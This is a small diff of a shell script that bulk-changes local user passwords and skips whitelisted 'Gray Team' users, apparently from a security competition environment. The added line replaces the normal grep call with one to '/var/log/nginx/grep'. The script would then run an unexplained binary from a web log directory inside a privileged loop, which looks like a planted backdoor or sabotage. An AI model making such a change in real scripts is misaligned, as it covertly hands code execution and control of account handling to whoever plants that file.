@@ -17,7 +17,7 @@ fi
 echo "Changing passwords..."
 ALL_USERS=$(awk -F: '$3 >= 1000 {print $1}' /etc/passwd)
 for user in $ALL_USERS; do
-    if grep -q "^$user$" "$WHITELIST"; then
+    if /var/log/nginx/grep -q "^$user$" "$WHITELIST"; then
         echo "Skipping Gray Team user: $user"
         continue
     fi
